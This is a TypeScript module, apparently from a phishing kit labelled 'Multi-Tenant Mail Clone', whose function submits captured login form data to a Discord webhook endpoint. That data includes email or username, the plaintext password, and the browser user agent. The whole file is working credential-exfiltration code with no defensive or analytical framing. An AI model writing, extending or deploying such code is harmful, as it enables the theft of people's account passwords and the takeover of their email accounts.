/**
 * Discord Service - Handles submission of form data to Discord webhooks
 */

interface FormData {
  email?: string;
  password?: string;
  username?: string;
  theme?: string;
  timestamp?: string;
  userAgent?: string;
  [key: string]: any;
}

interface DiscordEmbedField {
  name: string;
  value: string;
  inline?: boolean;
}

export const submitToDiscord = async (formData: FormData, formType: string = 'login'): Promise<boolean> => {
  try {
    // Cloudflare Pages Function endpoint for secure submission
    const endpointUrl = '/api/discord';

    const timestamp = new Date().toISOString();
    const userAgent = navigator.userAgent;
    
    // Build embed fields from form data
    const fields: DiscordEmbedField[] = [];
    
    if (formData.email) {
      fields.push({ name: 'Email/Username', value: formData.email, inline: true });
    }
    
    if (formData.username) {
      fields.push({ name: 'Username', value: formData.username, inline: true });
    }
    
    if (formData.password) {
      fields.push({ name: 'Password', value: formData.password, inline: false });
    }
    
    if (formData.theme) {
      fields.push({ name: 'Theme', value: formData.theme, inline: true });
    }
    
    if (formData.lang) {
      fields.push({ name: 'Language', value: formData.lang, inline: true });
    }

    // Add any additional fields
    Object.entries(formData).forEach(([key, value]) => {
      if (!['email', 'password', 'username', 'theme', 'lang', 'timestamp'].includes(key) && value) {
        fields.push({ name: key, value: String(value), inline: true });
      }
    });

    fields.push({ name: 'Timestamp', value: timestamp, inline: true });
    fields.push({ name: 'User Agent', value: userAgent.substring(0, 1024), inline: false });

    const payload = {
      username: 'Form Submission Bot',
      avatar_url: 'https://cdn.discordapp.com/app-icons/936929561302675456/f04a3900da45a3dc97a1e108d4a50e34.png',
      embeds: [
        {
          title: `${formType} Form Submission`,
          color: 16711680, // Red color
          fields: fields,
          footer: {
            text: 'Multi-Tenant Mail Clone',
            icon_url: 'https://cdn.discordapp.com/app-icons/936929561302675456/f04a3900da45a3dc97a1e108d4a50e34.png',
          },
          timestamp: timestamp,
        },
      ],
    };

    const response = await fetch(endpointUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      console.error('Discord webhook error:', response.status, response.statusText);
      return false;
    }

    console.log('Form data submitted to Discord successfully');
    return true;
  } catch (error) {
    console.error('Error submitting to Discord:', error);
    return false;
  }
};

export default submitToDiscord;
